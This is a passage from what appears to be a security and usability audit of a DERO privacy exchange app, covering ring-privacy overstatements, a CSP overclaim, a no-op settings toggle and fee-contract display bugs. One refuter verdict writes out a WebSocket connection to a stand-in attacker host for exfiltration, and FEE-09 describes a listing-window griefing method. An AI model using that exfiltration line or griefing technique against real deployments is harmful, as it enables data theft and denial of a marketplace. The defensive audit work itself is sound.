So the one local record of a social judgement the user made about named DERO addresses survives the button whose label promises a clean device, and there is no other control that removes it.
- **Preconditions** The user has muted at least one chat address and then used the clear button believing the device is clean — before handing the machine over, or on a shared browser.
- **Impact** A list of DERO addresses this user chose to mute persists in localStorage after an explicit clear. Small in volume, but it is behavioural data about specific named counterparties, and the failure mode is a user who believes they removed it.
- **Exploitability** Local access to the browser profile.
- **Reproduced** no — grep -n 'startsWith("veil.")' app/screens.js -> line 277, the clear handler. grep -n 'MUTE =' app/chat.js -> line 24, "dmz.chat.mute". Enumerating every storage write confirms it is the only outlier: `grep -rn "localStorage.setItem|sessionStorage.setItem" app/*.js` returns veil.endpointOk, veil.settings, MUTE (dmz.chat.mute), the two feed cache keys, veil.trades, the stats watchlist key and the xswd session id. Verified by reading the source, not by clicking the button in a browser.
- **Fix** Two-line change, safe now: either rename the constant at app/chat.js:24 to "veil.chat.mute" (existing mutes are forgotten once, which is the conservative direction for a privacy key), or widen the predicate at app/screens.js:277 to `(k.startsWith("veil.") || k.startsWith("dmz.")) && k !== "veil.settings"`. I would take the rename: one prefix for everything this app stores is the property that stops the next key from being missed.
- **Regression test** A JS test under tests/js that greps app/*.js for every localStorage.setItem key literal and fails if any does not start with the prefix the clear handler matches — enforcing the invariant against the next key added, not just this one.
- **Safe to fix now** yes · files: app/chat.js, app/screens.js
- **Already known as** Noted in passing by the browser-app architecture map ("removes veil.* keys but not dmz.chat.mute — inconsistent prefix"); no finding id, no BL number.
- **Refuter verdicts** REAL/LOW/reproduced: Reproduced by running the clear handler's own predicate over the app's real key set: after `for (k of keys) if (k.startsWith("veil.") && k !== "veil.settings") remove(k)`, what survives is veil.settings and dmz.chat.mute. The button is labelled "Clear local trade history, watchlist and cache" and th || REAL/INFO/reproduced: The prefix inconsistency is real, but both of the finding's evidential claims about impact are false, and LOW overstates what is left. (1) 'there is no other control that removes it' is wrong: app/chat.js:165 renders a `<n> muted` button whose handler calls unmuteAll(), which does localStorage.remov

### PRIV-07 — In private mode the DERO burn destination is an address the node chooses, and it is a ring member — so the node knows one of the sixteen is not the payer, while three screens state "one of 16" without the caveat

- **Where** `app/app.js:121` (dimension: Privacy leaks (directive §19, §22) — what each flow writes on which chain, who can link what, and how the app's copy compares)
- **Attack path** app/app.js:121 obtains the DERO leg's burn destination with `V.node.randomAddress()` (DERO.GetRandomAddress) and pushes `{destination: dst, amount: 0, burn: opts.dero}`. vendor/derohe/walletapi/wallet_transfer.go:356-358 seeds the ring deduplicator with the receiver and the sender, and lines 360-392 fill the remaining ringsize-2 slots with decoys, so the ring for a ring-16 private buy is [payer, node-supplied destination, 14 wallet-drawn decoys]. The node that supplied the destination therefore knows, for the transaction it later sees, that one named member is the destination it handed out and is not the payer. The app states the property without that qualification in three places: app/screens.js:216 "Private mode: ring 16 · pays a named address", app/screens.js:272 "the payer is one of 16 accounts", app/token.js:240 "the wallet hides the payer among 16 accounts".
- **Preconditions** Private mode on a DERO-quoted market (a wrapped-quote buy attaches `{scid, burn}` with no destination and is unaffected), against a node the user does not run.
- **Impact** Anonymity set 15 rather than 16 for the one observer best placed to use it. Small in itself; it matters because it is a stated privacy figure that is not exactly right, on a screen whose credibility rests on the other statements around it being exact. A hostile node could also return a distinct marker address per request, tagging each private trade with an identifier it can tie to the HTTP request that asked for it — though it can already do that by IP.
- **Exploitability** Requires being the node. Yields one bit.
- **Reproduced** no — Reasoned from the vendored source; not measured on a live ring-16 transaction (no wallet assigned, so I sent none).   app/app.js:119-123 — randomAddress() -> `transfers.push({ destination: dst, amount: 0, burn: opts.dero })`.   vendor/derohe/walletapi/wallet_transfer.go:356-358 — `deduplicator[receiver_without_payment_id.String()] = true; deduplicator[w.GetAddress().String()] = true`, and 371-373 skip any candidate equal to the receiver or the sender, so both occupy ring slots and the loop fills only ringsize-2 more.   research/RING_PRIVACY.md §6.4 (measured 2026-09-06) confirms the node extracts no signer above ring 2, so the remaining set really is the ring. What is NOT measured: whether t
- **Fix** Copy, local and safe now: change the three sentences from "one of 16" to "one of 16 accounts in the transaction's ring — 15 in practice on a DERO-quoted market, because the burn destination is an address your node supplied and your node knows it is not you." Optionally, and separately, stop asking the node: any registered address the wallet already knows would serve as the burn destination, which removes the node's knowledge of that member — but that touches transaction construction and belongs in its own change with a simulator run behind it.
- **Regression test** Not a unit test — the honest closure is the measurement RING_PRIVACY.md §6 item 2 already asks for: three different simulator wallets making private buys to one destination, DERO.GetTransaction on each, asserting `signer` is absent, recording the 16 ring members, and checking whether the node-supplied destination appears in each. Add it as a step in tools/uitest or a small sim driver, with its output appended to research/ringprobe.log.
- **Safe to fix now** yes · files: app/screens.js, app/token.js
- **Already known as** Raised as unexamined by the first audit (DMZ_OPUS5_MASSIVE_AUDIT.md:180: "whether DERO's GetRandomAddress-supplied burn destination weakens the ring at ringsize 16 ... I could not settle DERO's ring construction from this repo and did not report it"). I settled it from the vendored wallet. No BL number.
- **Refuter verdicts** REAL/LOW/reproduced: The conclusion is right — "one of 16" is not accurate — but the mechanism and the number are both wrong, and the truth is worse, so I am confirming the finding while replacing its arithmetic (see MISS-PRIV-A). What holds: app/app.js:119-123 does take the DERO leg's burn destination from V.node.rando || REAL/HIGH/reproduced: The mechanism is real but the NUMBER IS WRONG, the CAUSE is wrong, and the proposed fix would ship a new false figure onto three screens. I measured it. Proof.Parity() (vendor/derohe/cryptography/crypto/proof_generate.go:76-83) returns true iff f.Element(0) == 0, and f is part of the serialised proo

### UX-09 — Settings claims the CSP blocks every connection except the user's node, wallet and image hosts; connect-src permits wss: to any host on the internet

- **Where** `app/screens.js:262` (dimension: Real-world failure states, false confidence, product structure (§31, §32, §47, §48) — rendered-app audit)
- **Attack path** 1. app/screens.js:262 renders, under a green check in the Security & privacy list: "A Content Security Policy blocks any script that is not part of this build and any connection except your node, your wallet and image hosts." 2. app/index.html:6 `connect-src 'self' ws://127.0.0.1:* ws://localhost:* wss: http://127.0.0.1:* http://localhost:*`. The bare `wss:` is a scheme-source: it matches every host on the internet over TLS WebSocket. The script-src half of the claim is accurate ('self' only, and the uitest confirms an inline script is blocked); the connection half is not. 3. What actually restricts outbound connections is the app's own endpointURL gate (rpc.js:99-111, loopback or wss only) plus the per-session confirmation for remote endpoints (app.js:15-17). Those are real controls — but they are application logic, not the CSP, and the sentence attributes the guarantee to the wrong layer.
- **Preconditions** None; rendered to every visitor who opens Settings.
- **Impact** A security claim on a security screen is stronger than it should be. The practical exposure is small — an attacker who can inject script into this origin has already defeated script-src, and the endpoint gate is the binding control — but the sentence is the one a privacy-conscious user would rely on to conclude that a compromised page could not exfiltrate. It could not exfiltrate *via a script it injected*; the CSP would not stop a connection to an arbitrary wss host. On a product that stakes its case on being honest about what is checked, an overclaimed control is worth more than its exploit value.
- **Exploitability** Low. Requires script execution on the origin, which script-src already blocks; the residual is defence-in-depth.
- **Reproduced** yes —   sed -n '6p' app/index.html   → connect-src 'self' ws://127.0.0.1:* ws://localhost:* wss: http://127.0.0.1:* http://localhost:*   sed -n '256,266p' app/screens.js   → the claim at line 262.   Rendered: .sim/ui-audit-ux/03-settings.png, Security & privacy list, fourth green check.   The uitest's own first line confirms only the script half: "• CSP: inline script blocked · 1 violation report(s)".
- **Fix** Two options; take both.  (1) Tighten the policy so the claim becomes true: replace the bare `wss:` in index.html:6 with nothing, and have Settings' "Use it this session" flow be the only path to a remote node — but that breaks remote wss nodes entirely, since a meta CSP cannot be amended at runtime. So instead:  (2) Say what is true, at screens.js:262: "A Content Security Policy blocks any script that is not part of this build, any plugin, and any frame. Connections are limited by this app, not by the policy: it will only open a socket to a node on this device or to a wss:// address you confirmed in Settings, and — if you turn images on — to the image hosts creators named."  That sentence is accurate, names the real control, and is no weaker a promise. Copy only; screens.js has 6 KB of DOC headroom.
- **Regression test** tests/js: assert that if app/index.html's connect-src contains a bare `wss:` token, no file in app/ contains the substring "any connection except". A two-line consistency check that ties the claim to the policy so they cannot drift.
- **Safe to fix now** yes · files: app\screens.js, tests\js
- **Already known as** Noted by the app-subsystem architecture reader; not in docs/BACKLOG.md and not in the prior audits.
- **Refuter verdicts** REAL/LOW/reproduced: Real. app/index.html:6 connect-src is `'self' ws://127.0.0.1:* ws://localhost:* wss: http://127.0.0.1:* http://localhost:*` — the bare `wss:` is a scheme-source matching every host on the internet — and app/screens.js:262 claims the policy blocks 'any connection except your node, your wallet and ima || REAL/LOW/reproduced: Reproduced against the live policy rather than by reading it, which is what this claim needed. In a page loaded WITHOUT bypassCSP, `new WebSocket("wss://evil.example.net/exfil")` constructed with no throw and no violation report, while `ws://evil.example.net` and `fetch("https://evil.example.net")` 

### UX-10 — Settings ships a working-looking "Use indexer read cache" toggle that does nothing: the setting is written and never read

- **Where** `app/screens.js:250` (dimension: Real-world failure states, false confidence, product structure (§31, §32, §47, §48) — rendered-app audit)
- **Attack path** 1. app/screens.js:250 renders a toggle labelled "Use indexer read cache" with the sub-line "Optional Gnomon cache. The app always falls back to reading the node." 2. Toggling it calls `V.app.saveSettings({ indexer: on })`, which persists `veil.settings.indexer` to localStorage. 3. `grep -rn 'settings.indexer\|\.indexer' app/*.js` finds the write at screens.js:250 and no read anywhere. No indexer client exists in the bundle; every read still goes through V.node. 4. The toggle is placed inside the Node section, immediately under the endpoint override — the position that implies it changes where reads come from.
- **Preconditions** None.
- **Impact** A user who wants to reduce what their node operator learns about their browsing, or who is told an indexer is faster, flips a control that has no effect and is given no feedback. It is a small false confidence, but it sits on the Settings screen among controls that do work (images, reduce motion, endpoint), which is what makes it credible. §31: the app presents a capability it does not have.
- **Exploitability** n/a.
- **Reproduced** yes —   grep -rn 'indexer' app/*.js   → app/screens.js:250 only (the toggle and its saveSettings write). No read site in any file.   Rendered: .sim/ui-audit-ux/03-settings.png — "Use indexer read cache / Optional Gnomon cache. The app always falls back to reading the node." with a live toggle, directly beneath "Save endpoint".
- **Fix** Delete the toggle (app/screens.js:250) and the `indexer` key from the settings defaults at app/app.js:11. Two lines removed, ~200 bytes of DOC budget returned. If a Gnomon cache is still intended, it belongs in docs/BACKLOG.md, not in the shipped Settings screen — a control that will exist later is indistinguishable, to the user, from one that is broken now.
- **Regression test** tests/js: assert that every key in the app.settings defaults object at app/app.js:11 appears as a read (not only a write) somewhere in app/. That is the general check; it fails today on `indexer` alone.
- **Safe to fix now** yes · files: app\screens.js, app\app.js, tests\js
- **Already known as** PERF·F11 in docs/audit/DMZ_FABLE_5_1_FOLLOWUP.md, recorded as open. Accurately scoped there.
- **Refuter verdicts** REAL/LOW/reproduced: Real: `grep -rn 'indexer' app/*.js` returns exactly one line, app/screens.js:250, and it is a write with no read. The toggle does nothing.  Two corrections, both of which the finder would have caught by running their own grep. (a) The fix says 'delete … the `indexer` key from the settings defaults a || REAL/LOW/reproduced: Reproduced end to end, including the behavioural half the grep alone does not settle. `indexer` appears exactly once in app/ — the write at screens.js:250 — with no read site. Driving it: localStorage went from a settings object with no `indexer` key to one containing `"indexer":true`, and navigatin

### UX-11 — The first-run intro headlines "Trading is private by default", which the Trade hub and Settings both contradict two taps away

- **Where** `app/app.js:268` (dimension: Real-world failure states, false confidence, product structure (§31, §32, §47, §48) — rendered-app audit)
- **Attack path** 1. app/app.js:268, step 2 of the intro sheet shown on first run: title "Trading is private by default", detail "Balances are encrypted. A trade only shows up in the feed if you switch on “Post this trade” for that trade." 2. The detail is true. The title is not, and the title is what a reader takes away — it is the bold line, and the two facts beneath it are about *balances* and *the feed*, neither of which is the thing at issue. 3. app/home.js:211, the Trade hub, states the truth: "An ordinary swap is a ring-size-2 call, so the address that pays is public in that transaction; private mode raises the ring to 16 and pays a named address instead." 4. app/screens.js:272, Settings, states it more strongly: "Contract calls that pay you need ringsize 2, and anyone can compute which address paid a ringsize-2 call, not only the contract." 5. So the first sentence a new user reads about privacy is the only one in the app that overstates it, and every correction is behind a tab they have not opened yet.
- **Preconditions** First run, before `veil.settings.seen` is set. Also reachable from Settings' "Show the intro again".
- **Impact** The default trade path is ring 2 and links the payer to the trade forever. A user who has read "Trading is private by default" and nothing else will make that trade believing the opposite. §32/§47: on a privacy product, the onboarding overclaim is the one that costs most, because it is read exactly once, by everyone, before they have any basis to check it.
- **Exploitability** n/a.
- **Reproduced** yes —   sed -n '262,272p' app/app.js   → the intro steps, step 2 as quoted.   sed -n '208,215p' app/home.js  → the Trade hub's correct statement.   sed -n '270,274p' app/screens.js → Settings' correct statement.   The intro renders on first load; tools/uitest/ui.mjs dismisses it via #introOk on every run (see ui.mjs and my ux-deep.mjs), which is why it does not appear in the captured PNGs.
- **Fix** app/app.js:268 — retitle to what the two facts beneath it actually support, and add the one fact they omit:    step("2", "Your balances are private; your trades are not, by default", "Balances on DERO are encrypted and only your wallet can read them. But an ordinary swap is a ring-size-2 call, so anyone can work out which address paid it. Private mode in the trade sheet raises the ring to 16 and pays an address you name. A trade only appears in the public feed if you switch on “Post this trade”.")  Copy only, in a file with headroom.
- **Regression test** tools/uitest/ui.mjs: before dismissing the intro, capture #sheet innerText and assert it contains "ring" — i.e. that the onboarding names the ring-size fact at all. Fails today.
- **Safe to fix now** yes · files: app\app.js, tools\uitest\ui.mjs
- **Already known as** Noted in passing by the app-subsystem architecture reader; not in docs/BACKLOG.md.
- **Refuter verdicts** REAL/LOW/reproduced: Real. app/app.js:268 step 2 is titled 'Trading is private by default' and the two facts under it are about encrypted balances and the opt-in feed, neither of which is the ring size. app/home.js:211 and app/screens.js:272 both state the truth plainly, and DECISIONS.md:123 plus vendor/derohe/blockchai || REAL/LOW/reproduced: Reproduced by capturing the intro sheet before dismissing it, which the standard uitest never does. Step 2's bold line is 'Trading is private by default'; the two facts under it are about balance encryption and feed opt-in, neither of which is the ring-size fact, and the word 'ring' does not appear 

### UX-12 — Information architecture: no navigation label names the product — "Wrap" is the XMR/ZEC exchange and "NFTs" carries the XMR/ZEC-priced asset market

- **Where** `app/index.html:35` (dimension: Real-world failure states, false confidence, product structure (§31, §32, §47, §48) — rendered-app audit)
- **Attack path** Not an attack — the §48 assessment the directive asked for, against the current app rather than in the abstract.  app/index.html:32-39 defines the nav: Home · Markets · Trade · Wrap · NFTs · Chat · Portfolio · Profile. Not one of the eight words is Monero, Zcash, XMR or ZEC. Read cold, the nav describes a generic DEX with a wrapping utility.  The two labels that carry the actual product are the two weakest:   - "Wrap" (index.html:35) is the entire Monero/Zcash deposit-and-withdraw product. The screen behind it is titled "Deposit & withdraw XMR" and does its job well; the label is DERO-side jargon for the mechanism, and it is what a visitor sees before they click.   - "NFTs" (index.html:36) is the most generic noun in crypto and it fronts three unrelated things: the Founders Pass (a revenue-share instrument), NFAs (the ART-NFA-MS1 asset market, which is where assets are priced in XMR and ZEC), and holder badges. The screen's own subtitle has to spend a full sentence disambiguating: "Assets priced in XMR and ZEC, each sold or auctioned by its own contract; the Founders Pass, which shares the exchange's fees with its holders; and holder NFTs, earned by holding a token."  Against §0's first standing requirement — XMR/ZEC first and obvious on *every* screen — the persistent navigation, which is on every screen, names them nowhere.
- **Preconditions** None.
- **Impact** §47. The nav is the frame every screen is read inside. A serious privacy protocol whose front door reads Home/Markets/Trade/Wrap/NFTs is asking to be filed as a template exchange. Combined with UX-07 (the DERO-led hero) the first five seconds of the product communicate the opposite of §0.
- **Exploitability** n/a.
- **Reproduced** yes —   sed -n '30,41p' app/index.html   → the eight tab labels.   Rendered in every captured screen's tab bar: .sim/ui-audit-ux/01-home.png, 02-wrap.png, 02-nfts.png etc. The uitest reports "• tabs: home markets trade wrap nfts chat portfolio profile (7 visible at this width)".   Contrast .sim/ui-audit-ux/02-markets.png, where the *filter chips* correctly lead "XMR · ZEC · Split pairs · Trending · New · Gainers…" — the app already knows this rule and applies it one level below the nav.
- **Fix** Rename two labels in app/index.html and their icon ids stay as they are:    line 35: "Wrap" → "XMR / ZEC"  (the screen behind it is already titled "Deposit & withdraw XMR"; the route name `wrap` and every deep link stay unchanged)   line 36: "NFTs" → "Assets"  (and reorder the screen so the NFA section, which is the XMR/ZEC-priced market, leads and the Founders Pass follows it — nfts.js:129-133 renders them in the reverse order today)  Both are label-only; no route, hash, or router registration changes, so every deep link and the uitest's tab assertions keep working. The width of "XMR / ZEC" at the phone breakpoint needs checking against the seven-visible-tabs assertion the uitest already makes — which is exactly what the regression test below covers.  I would not go further than this without the operator: the section ordering inside the Assets tab is a judgement about what the Founders Pass is for, and the directive says integrate rather than promote it — which the current build already does correctly.
- **Regression test** tools/uitest/ui.mjs already asserts tab count and horizontal overflow at 390px, 768px and 1024px; those assertions cover the label-width risk as-is. Add one: assert the rendered nav text matches /XMR/ — i.e. that the persistent navigation names the product at all. Fails today.
- **Safe to fix now** yes · files: app\index.html, tools\uitest\ui.mjs
- **Already known as** Not in the backlog. §48 asks specifically whether a Founders page is warranted; the answer is that Founders is correctly integrated (see the fine list) and that the problem lies one level up, in the tab labels.
- **Refuter verdicts** REAL/INFO/reproduced: The observation is accurate — app/index.html:32-39 gives eight tabs (Home, Markets, Trade, Wrap, NFTs, Chat, Portfolio, Profile) and I confirmed it visually in .sim/ui-audit-ux/02-profile.png, which shows the seven-tab bar with no XMR or ZEC anywhere in it. The §48 assessment is also sound and match || REAL/LOW/reproduced: Reproduced as a design fact: the rendered nav reads 'HOME MARKETS TRADE WRAP NFTS CHAT PORTFOLIO' and matches no /XMR|ZEC|Monero|Zcash/. Against standing requirement 1 (XMR/ZEC first and obvious on every screen) the persistent navigation, which is on every screen, names them nowhere, and the two lab

### UX-13 — An NFA gets the unqualified "Verified" shield, in an app whose badge tiers are otherwise careful, on the one asset class whose creator can rewrite its file forever

- **Where** `app/ui.js:104` (dimension: Real-world failure states, false confidence, product structure (§31, §32, §47, §48) — rendered-app audit)
- **Attack path** 1. app/ui.js:90-104 defines five qualified badge tiers before the fallthrough — "Code checked · name is not" for an impersonator, "Code checked · treasury unread", "Wrapped asset · verified", "Pool verified · asset unknown", "Code verified · not listed" — each with a title that states exactly what was and was not checked. This is careful work and it is the app's best safety feature. 2. An NFA record carries none of those flags, so app/nfas.js:199 `U.verified(s)` falls through to line 104: the unqualified green shield reading "Verified", title "Contract code matches the shipped template and pays the protocol treasury". 3. That is true and materially incomplete for this asset class. nfa.bas Update (lines 104-120) lets `creatorAddr` rewrite iconURLHdr, coverURL, fileURL, fileSignURL and tagsHdr at any time, for the life of the asset, regardless of who owns it and whether it is listed. The NFA page says so itself — but 1,200 pixels further down, in the On-chain table: "URL updates: the creator can change the file, cover, icon and tag URLs at any time, listed or not; the name, hashes and collection cannot change." 4. So the strongest reassurance in the app sits in the header and its qualification sits below the fold, on the only asset where the file a buyer is paying for is mutable by a third party. 5. Same fallthrough at app/nfts.js:29, where `U.verified()` is called with no argument at all for the Founders Pass hero, producing a badge whose title asserts a treasury check that was not performed for that contract.
- **Preconditions** Viewing any NFA page or the NFTs tab.
- **Impact** Small in isolation; notable because it is the one place the tier system — which exists precisely to stop a shield from blessing something it did not check — does not fire. A buyer of an XMR-priced NFA reads "Verified" next to the price and has to scroll past the fee split, the listing table and the owner rows to learn the artwork can be swapped after they buy it.
- **Exploitability** A creator lists an NFA with a desirable file, sells it, then calls Update to point fileURL elsewhere. Costs one gas fee. The contract permits it by design (it is upstream ART-NFA-MS1 behaviour); the app's job is to say so where the decision is made.
- **Reproduced** yes —   sed -n '88,105p' app/ui.js   → the five tiers and the unqualified fallthrough at line 104.   grep -n 'U.verified' app/nfas.js app/nfts.js → nfas.js:199 `U.verified(s)`, nfts.js:29 `U.verified()`.   Rendered: .sim/ui-audit-ux2/c4-nfa-xmr.png — top-right of the hero, green shield "Verified", beside the eyebrow "NFA · PRICED IN XMR"; the "URL updates: the creator can change the file, cover, icon and tag URLs at any time" row is in the On-chain table far below. .sim/ui-audit-ux/02-nfts.png shows the same unqualified shield on the Founders Pass hero.
- **Fix** Add one tier to app/ui.js verified(), before the fallthrough:    if (s && s.kind === "nfa") return h("span", { class: "verified warn" }, icon("shield"), "Code verified · file can change") with title "The contract matches the ART-NFA-MS1 template, pays the protocol treasury, and its name, hashes and collection are fixed. The creator can point the file, cover and icon URLs somewhere else at any time, before or after a sale."  and pass an explicit record at app/nfts.js:29 rather than calling U.verified() bare, so the Founders Pass badge asserts only what was checked. ui.js is 10,892 of 18,432 DOC bytes.  Local, no contract change, and it uses the mechanism the file already established.
- **Regression test** tools/uitest/ui.mjs, or the existing scratchpad nfa-ui.mjs pass: navigate to an NFA page and assert the badge text is not exactly "Verified". Fails today for both simulator NFAs.
- **Safe to fix now** yes · files: app\ui.js, app\nfts.js, tools\uitest\ui.mjs
- **Already known as** Adjacent to the NFA R12 hazard (creator Update forever) recorded in docs/NFA.md §7 and to BL-61 (no Update sheet). The badge-tier gap itself is not recorded.
- **Refuter verdicts** REAL/LOW/reproduced: Real and I confirmed both halves rendered. app/ui.js:90-104 defines five qualified tiers and falls through at line 104 to the unqualified 'Verified' with title 'Contract code matches the shipped template and pays the protocol treasury'. An NFA record carries none of the five flags, so app/nfas.js:19 || REAL/LOW/reproduced: Reproduced from the DOM, not from a screenshot. On #nfts the Founders Pass hero badge renders class 'verified' (not 'verified warn') with text exactly 'Verified' and title 'Contract code matches the shipped template and pays the protocol treasury' — the ui.js:104 fallthrough. nfts.js:29 calls U.veri

### FEE-08 — The "Release waiting DERO" button is offered on a condition under which Distribute() provably moves nothing, burning the caller's fee

- **Where** `app/nfts.js:100` (dimension: Fee architecture and distribution security (directive §7, §8, §14) — founders.bas line by line, the treasury bot, and every app surface that states a fee or a share)
- **Attack path** app/nfts.js accounting() computes `release = waiting > Z && f.hst > Z` (waiting = und) and renders a "Release waiting DERO" button. contracts/founders.bas Distribute (149-154) calls distribute(0), which at line 246 takes the GOTO 90 branch whenever hst < minhst and stores und unchanged, then RETURN 0. The transaction succeeds, nothing moves, and app.tx reports success because Distribute carries no probe. The app never reads `minhst`, so it cannot know the difference.
- **Preconditions** 0 < hst < minhst — the shipped default has minhst 11, so any pass with between 1 and 10 registered units, which is where every pass starts.
- **Impact** A user pays a network fee for a transaction guaranteed to do nothing and is told it worked. Trivial in DERO terms, but this is the screen that is supposed to prove the accounting, and it teaches the user that the waiting pool is releasable when it is not.
- **Exploitability** Self-inflicted; repeatable.
- **Reproduced** yes — tests/founders_attack_test.go:TestFoundersDistributeIsANoOpBelowTheFloor. Output:       founders_attack_test.go:328: hst 5 of minhst 11: Distribute returns 0, moves nothing, and costs the caller a fee; und stays 777777   --- PASS (the call returns OK with zero transfers and und unchanged at 777777). App side read at app/nfts.js:98-100.
- **Fix** Add "minhst" to the NUM key list in app/founders.js:13 and change the condition at app/nfts.js:98 to `waiting > Z && f.hst >= f.minhst`. Below the floor, replace the button with the fact: "<waiting> DERO is waiting; it is released once <minhst> passes are registered (<hst> are)." That also corrects the mislabelled row at nfts.js:96, "Waiting for the first registration", which is wrong whenever hst > 0. Local, no contract change; `minhst` is absent on the legacy deployed pass (FEE-06) so the code must tolerate an undefined key by falling back to the current behaviour.
- **Regression test** tests/founders_attack_test.go:TestFoundersDistributeIsANoOpBelowTheFloor keeps the contract fact pinned. Add a uitest assertion that the Founders screen shows no "Release waiting DERO" button while hst < minhst.
- **Safe to fix now** yes · files: app/nfts.js, app/founders.js, tools/uitest/ui.mjs
- **Already known as** New. Not in the backlog; UX·F5 is the vault analogue.
- **Refuter verdicts** REAL/LOW/reproduced: Real, reproduced, and the finder actually understates the defect. Confirmed: app/nfts.js:99 computes `release = waiting > Z && f.hst > Z` and renders 'Release waiting DERO'; contracts/founders.bas:149-154 Distribute calls distribute(0), which takes the GOTO 90 branch whenever hst < minhst, stores un

### FEE-09 — Three hundred List/Unlist cycles of a single pass push every genuine listing out of the app's marketplace window

- **Where** `app/founders.js:21` (dimension: Fee architecture and distribution security (directive §7, §8, §14) — founders.bas line by line, the treasury bot, and every app surface that states a fee or a share)
- **Attack path** app/founders.js:21 reads only the last 300 listing ids (from = max(0, ln - 300)) and skips ids whose keys do not exist. contracts/founders.bas List (178-193) increments `ln` on every call, needs only one unit attached and no DERO, and Unlist (195-208) returns the unit and deletes the keys but never decrements `ln`. So one pass unit, cycled through List+Unlist 300 times, advances `ln` past every genuine listing while leaving nothing behind for the app to render.
- **Preconditions** One pass unit and about 600 transactions of gas. Repeatable indefinitely.
- **Impact** The pass marketplace renders empty in the app while live listings exist on chain — a griefing denial of the only secondary market for the instrument, and a nudge toward off-app trading. Sellers can recover by re-listing (new ids), so it is a nuisance rather than a lock; the attacker can simply repeat.
- **Exploitability** Cheap, and permanent in effect: `ln` never goes down.
- **Reproduced** yes — tests/founders_attack_test.go:TestFoundersListingWindowIsPushedOutByOneUnit. Output:       founders_attack_test.go:362: ln 301, the app reads ids 1..300; the genuine listing is id 0 and the griefer's 300 ids are all deleted       founders_attack_test.go:370: on chain la=1 (one live listing); in the app the marketplace renders empty   --- PASS
- **Fix** Local, app-side. founders.bas already keeps `la`, the count of live listings. app/founders.js should walk backwards from ln until it has collected `la` listings (or exhausted a hard read budget), and app/nfts.js must say when the two disagree: "<la> listings on chain, <n> shown". A contract-side fix (a free-id list, or refusing a List from an address that already has an open listing) is a template change and an operator decision; it is not needed to close the display hole.
- **Regression test** tests/founders_attack_test.go:TestFoundersListingWindowIsPushedOutByOneUnit pins the chain behaviour. Add a tests/js case over a stubbed getSC that a pass with la = 1 at id 0 and ln = 301 still yields one listing from loadFounders.
- **Safe to fix now** yes · files: app/founders.js, app/nfts.js, tests/js
- **Already known as** New. BL-45 covers posting spam on board.bas, not this. Nothing in the backlog covers the pass marketplace view.
- **Refuter verdicts** REAL/LOW/reproduced: Real and reproduced. app/founders.js:21 reads only the last 300 ids (`from = Math.max(0, Number(f.ln) - 300)`); contracts/founders.bas:178-193 List increments `ln` on every call and needs only one unit and no DERO; :195-208 Unlist returns the unit, deletes the keys and never decrements `ln`. One uni

### FEE-10 — The app's pending-reward figure ignores the accumulator's era rollover, so after a rollover it shows 0 and hides the Claim control

- **Where** `app/founders.js:31` (dimension: Fee architecture and distribution security (directive §7, §8, §14) — founders.bas line by line, the treasury bot, and every app surface that states a fee or a share)
- **Attack path** contracts/founders.bas settle() (263-288) walks the closed eras: for each e from he_<addr> to era-1 it credits hu*(ea_<e> - hd)/2^32 with hd reset to 0, then adds hu*(acc - hd)/2^32. app/founders.js:30-31 reads only hu_ and hd_ and computes `pend = hu > 0 && f.acc > hd ? hu*(f.acc-hd)/2^32 : 0` — it never reads he_, `era` or ea_<e>. A holder whose snapshot belongs to a closed era has hd_ > the current acc, so the ternary evaluates to 0.
- **Preconditions** One accumulator rollover, which needs 2^32 atomic units (42,949 DERO) distributed per registered unit — reachable with a small registry over a long life, e.g. 20 units and about 859,000 DERO of cumulative deposits, or a single registered unit and about 43,000 DERO.
- **Impact** A holder who is genuinely owed is told they are owed nothing, and the Claim path is hidden from them in the app. The money is not lost — PayBatch, or Claim called by any other means, still pays correctly — but the app's number is wrong in the one direction that costs the user.
- **Exploitability** Not attacker-driven, though an attacker who could force a rollover (they cannot cheaply) would silence every holder's Claim button at once.
- **Reproduced** no — Read-only: app/founders.js:30-31 fetches ["hu_", "hd_"] and app/founders.js:13's NUM list omits `era`; contracts/founders.bas:268-276 shows settle's era walk; tests/saturation_test.go:TestFoundersAccSaturation confirms eras do occur (log: eras 3, acc 12884901888000000000). I did not force an era rollover through the app.
- **Fix** app/founders.js: add "era" to the NUM list (line 13), fetch "he_" alongside hu_/hd_ in myFounders (line 30), and when he_ < era either walk ea_<e> for the missing eras (three extra key reads in the realistic case) or, if the byte budget were tight — app/founders.js is 1,840 of 18,432, so it is not — show "claimable" without a figure rather than 0. Local, no contract change.
- **Regression test** A tests/js case against a stubbed getSC: he_ = 0, era = 1, ea_0 = 2^63, acc small — myFounders must return a non-zero pending. Pair it with a DVM test that a holder settled across a rollover receives the same total as the sum of the per-era shares (TestFoundersAccSaturation already proves the contract side).
- **Safe to fix now** yes · files: app/founders.js, tests/js
- **Already known as** New. The contract-side era mechanism is tested (tests/saturation_test.go:TestFoundersAccSaturation, 3 eras) but no test or backlog item covers the app's mirror of it.
- **Refuter verdicts** REAL/LOW/reproduced: Real, and REPRODUCED — the finder marked it reasoned-only, but another auditor's test already in the tree fails on exactly this and I ran it. app/founders.js:31 computes pend from hu_ and hd_ against the current acc and never reads he_, `era` or ea_<e>; contracts/founders.bas:263-288 settle() walks 

### FEE-11 — The app's "Push rewards to holders" button is hard-coded to holders 0..14, so beyond fifteen holders the rest can never be pushed from the app

- **Where** `app/nfts.js:99` (dimension: Fee architecture and distribution security (directive §7, §8, §14) — founders.bas line by line, the treasury bot, and every app surface that states a fee or a share)
- **Attack path** app/nfts.js:99 sends PayBatch with `from` fixed at 0n and `n` fixed at 15n. contracts/founders.bas PayBatch (158-175) pays holders from..from+n-1 of the h_<i> registry and caps n at 15. With hn > 15 the app can only ever reach the first fifteen registry slots; holders at index 15 and above are never pushed. The registry order is arbitrary (remove() at 289-305 swap-deletes the last entry into the vacated slot), so which holders are reachable depends on withdrawal history.
- **Preconditions** More than 15 registered holders. Bounded above by maxsupply (hn <= hst <= minted <= maxsupply), so it does not arise at 20 editions but does at the shipped default of 500.
- **Impact** No loss — every holder can always pull with Claim, and tools/treasurybot loops all batches (main.go:177). It makes the app's public-good button partial and silently so, and it interacts with FEE-03: the button stays lit because rpool never clears, while pressing it cannot clear what is owed to holders past index 14.
- **Exploitability** None; a completeness defect.
- **Reproduced** no — Read-only: app/nfts.js:99 (["from","U",0n],["n","U",15n]) against contracts/founders.bas:162-172 and tools/treasurybot/main.go:177. Storage-gas headroom for the extra calls is ample — measured PayBatch(0,15) = 620 storage gas of the 20,000 cap (tests/founders_attack_test.go:TestFoundersFixedFeesCoverStorageGas).
